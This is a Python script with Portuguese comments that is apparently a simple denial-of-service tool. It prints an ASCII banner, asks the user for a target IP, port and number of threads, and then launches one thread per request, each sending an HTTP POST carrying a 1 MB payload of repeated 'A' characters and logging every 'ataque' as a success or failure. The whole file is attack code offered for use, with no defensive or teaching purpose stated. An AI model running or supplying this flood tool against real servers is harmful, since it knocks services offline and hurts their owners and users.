import threading
import socket
import requests  # Usado para fazer requisições HTTP
import time

# Função para exibir a interface com letras bastão
def exibir_interface():
    # ASCII art para o nome "DDoS Attack"
    print("""
    ███████╗██████╗ ██╗███████╗ ██████╗ ███████╗████████╗
    ██╔════╝██╔══██╗██║██╔════╝██╔══██╗██╔════╝╚══██╔══╝
    █████╗  ██████╔╝██║█████╗  ██████╔╝███████╗   ██║
    ██╔══╝  ██╔══██╗██║██╔══╝  ██╔══██╗╚════██╗  ██║
    ███████╗██║  ██║██║███████╗██║  ██║███████║  ██║
    ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝  ╚═╝
    """)

# Função para enviar requisições HTTP com 1MB de dados
def enviar_requisicao(ip, porta, ataque_numero):
    try:
        url = f"http://{ip}:{porta}"  # Monta a URL completa (HTTP)

        # Criando um payload de 1MB (1.048.576 bytes) para o ataque
        payload = "A" * 1048576  # 1MB de dados (exemplo com letra 'A')

        # Envia uma requisição POST com o payload de 1MB de dados
        resposta = requests.post(url, data=payload, timeout=5)  # Timeout de 5 segundos para a resposta
        
        # Checa se a requisição foi bem-sucedida (código 200 é sucesso HTTP)
        if resposta.status_code == 200:
            print(f"Ataque {ataque_numero} enviado com sucesso para {ip}:{porta} - Status: {resposta.status_code}")
        else:
            print(f"Ataque {ataque_numero} falhou para {ip}:{porta} - Status: {resposta.status_code}")
    
    except requests.exceptions.Timeout:
        print(f"Ataque {ataque_numero} falhou para {ip}:{porta} - Erro: Timeout")
    except requests.exceptions.ConnectionError:
        print(f"Ataque {ataque_numero} falhou para {ip}:{porta} - Erro: Conexão recusada (Connection Refused)")
    except Exception as e:
        print(f"Ataque {ataque_numero} falhou para {ip}:{porta} - Erro: {e}")

# Função principal para iniciar o ataque
def iniciar_ataque(ip, porta, threads):
    print("Iniciando envio de requisições...")
    for i in range(1, threads + 1):
        t = threading.Thread(target=enviar_requisicao, args=(ip, porta, i))
        t.start()
        time.sleep(0.1)  # Pequeno atraso entre o envio de cada requisição

# Exemplo de execução
exibir_interface()  # Chama a função para exibir a interface com o título
ip_destino = input("Digite o IP de destino: ")
porta_destino = int(input("Digite a porta de destino: "))
num_threads = int(input("Escolha o número de threads (ex.: 10): "))

iniciar_ataque(ip_destino, porta_destino, num_threads)
